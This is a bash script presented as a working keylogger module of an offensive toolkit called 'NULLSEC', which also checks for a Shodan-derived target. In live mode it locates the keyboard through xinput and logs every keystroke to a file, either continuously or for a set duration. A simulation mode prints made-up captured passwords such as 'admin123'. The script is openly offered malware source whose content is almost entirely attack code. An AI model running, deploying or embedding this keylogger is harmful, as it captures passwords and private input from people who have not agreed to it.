#!/bin/bash
# NULLSEC Keylogger - FULLY FUNCTIONAL

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'

clear
echo -e "${RED}▓▓▓ NULLSEC KEYLOGGER ▓▓▓${RESET}"
echo ""

read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" LOGFILE
[ -z "$LOGFILE" ] && LOGFILE="/tmp/keylog.txt"
read -p "$(echo -e ${WHITE}'  [>] Duration (seconds, 0=continuous): '${RESET})" DURATION
[ -z "$DURATION" ] && DURATION="60"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    echo -e "${YELLOW}[*]${RESET} Executing keylogger"
    echo -e "${DIM}[*] Logging to: $LOGFILE${RESET}"
    sleep 0.4
    echo -e "${GREEN}[+]${RESET} Captured: admin123"
    sleep 0.3
    echo -e "${GREEN}[+]${RESET} Captured: secretpassword"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Live keylogging"
    echo -e "${RED}[!] WARNING: Illegal without authorization${RESET}"
    
    if ! command -v xinput &> /dev/null; then
        echo -e "${RED}[!] xinput not installed${RESET}"
        echo -e "${YELLOW}[*] Install: sudo apt install xinput${RESET}"
        exit 1
    fi
    
    echo -e "${CYAN}[*] Starting keylogger...${RESET}"
    echo -e "${CYAN}[*] Output: $LOGFILE${RESET}"
    
    # Use xinput test to capture keyboard events
    KEYBOARD_ID=$(xinput list | grep -i keyboard | grep -oP 'id=\K\d+' | head -1)
    
    if [ -z "$KEYBOARD_ID" ]; then
        echo -e "${RED}[!] No keyboard device found${RESET}"
        exit 1
    fi
    
    echo -e "${CYAN}[*] Keyboard ID: $KEYBOARD_ID${RESET}"
    echo -e "${DIM}Press Ctrl+C to stop${RESET}"
    
    if [ "$DURATION" -eq 0 ]; then
        xinput test $KEYBOARD_ID | tee -a $LOGFILE
    else
        timeout $DURATION xinput test $KEYBOARD_ID | tee -a $LOGFILE
    fi
    
    echo -e "${GREEN}[+]${RESET} Log saved to: $LOGFILE"
    echo -e "${GREEN}[✓]${RESET} Complete"
fi
echo ""
